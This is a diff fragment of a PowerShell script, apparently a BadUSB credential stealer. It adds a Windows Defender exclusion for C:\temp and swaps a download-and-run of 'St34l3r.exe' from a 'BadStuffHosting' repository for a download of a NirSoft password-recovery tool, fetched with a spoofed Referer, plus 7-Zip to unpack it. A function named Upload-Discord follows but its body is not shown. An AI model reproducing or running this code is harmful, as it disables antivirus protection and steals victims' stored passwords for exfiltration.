@@ -3,10 +3,10 @@ function Get-Nirsoft {
     mkdir \temp
     cd \temp
     Add-MpPreference -ExclusionPath "C:\temp"
-
-    Invoke-WebRequest -Uri "https://github.com/Gvte-Kali/BadStuffHosting/raw/main/BadUSB/W1ns1d3r/testing/St34l3r.exe" -OutFile St34l3r.exe
-
-    .\St34l3r.exe
+    Invoke-WebRequest -Headers @{'Referer' = 'https://www.nirsoft.net/alpha/'} -Uri https://www.nirsoft.net/alpha/lostmypassword-x64.zip -OutFile St34l3r.zip
+    Invoke-WebRequest -Uri https://www.7-zip.org/a/7za920.zip -OutFile 7z.zip
+    Expand-Archive 7z.zip
+    .\7z\7za.exe e St34l3r.zip
 }
 
 function Upload-Discord {
